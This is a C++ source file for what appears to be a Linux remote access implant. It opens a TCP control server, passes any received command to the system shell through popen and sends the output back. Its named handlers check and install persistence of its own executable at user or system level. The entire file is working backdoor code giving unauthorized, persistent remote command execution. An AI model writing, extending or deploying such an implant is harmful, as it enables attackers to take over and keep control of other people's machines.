#include <cstdio>
#include <iostream>

#include "TcpControlServer.hpp"
#include "CommandHandler.hpp"
#include "persistence.h"

std::string check_persistence_status(std::vector<std::string> params)
{
    char path[PATH_MAX + 1];
    memset(path, 0, PATH_MAX + 1);
    readlink("/proc/self/exe", path, PATH_MAX);

    unsigned int persist = isPersistent(path);
    
    std::string response;

    if (persist == 0)
    {
        response = "Not installed";
    }
    else if (persist == 1)
    {
        response = "Installed as user";
    }
    else if (persist == 2)
    {
        response = "Installed as system";
    }
    else if (persist == 3)
    {
        response = "Installed as user and system";
    }
    
    return response;
}

std::string install_persistence_system(std::vector<std::string> params)
{
    char path[PATH_MAX + 1];
    memset(path, 0, PATH_MAX + 1);
    readlink("/proc/self/exe", path, PATH_MAX);

    unsigned int persist = isPersistent(path);
    
    std::string response;
    
    if (isPersistent(path) == 0)
    {
        installPersistence(path, System);

        if (isPersistent(path) == 2)
        {
            response = "Persistent as system";
        }
        else
        {
            response = "Persistence failed";
        }
    }
    else
    {
        response = "Already persistent";
    }
    
    return response;
}

std::string install_persistence_user(std::vector<std::string> params)
{
    char path[PATH_MAX + 1];
    memset(path, 0, PATH_MAX + 1);
    readlink("/proc/self/exe", path, PATH_MAX);

    unsigned int persist = isPersistent(path);
    
    std::string response;
    
    if (isPersistent(path) == 0)
    {
        installPersistence(path, User);

        if (isPersistent(path) == 1)
        {
            response = "Persistent as user";
        }
        else
        {
            response = "Persistence failed";
        }
    }
    else
    {
        response = "Already persistent";
    }
    
    return response;
}

std::string hello(std::vector<std::string> params)
{
    return std::string("This is hello world");
}

std::string shell(std::string command, std::vector<std::string> params)
{
    std::string response = "";
    
    command.append(" 2>&1");
    FILE* fp = popen(command.c_str(), "r");
    
    char buffer[4096];
    memset(buffer, 0, 4096);
    
    while (fread(buffer, 1, 4096, fp) > 0)
    {
        response.append(buffer);
        memset(buffer, 0, 4096);
    }
    
    pclose(fp);
    
    if (response == "")
        response = "[+] Command completed\n";
    
    return response;
}

int main(int argc, char** argv)
{
    std::string port = "";
    TcpControlServer service(port);
    std::thread t = service.startListener();
    
    CommandHandler dispatcher(&service, shell);
    
    // attach command handlers here
    dispatcher["install status"] = check_persistence_status;
    dispatcher["install system"] = install_persistence_system;
    dispatcher["install user"] = install_persistence_user;
    
    dispatcher.run();
    
    std::cout << "Joining the thread" << std::endl;
    t.join();
    
    return 0;
}
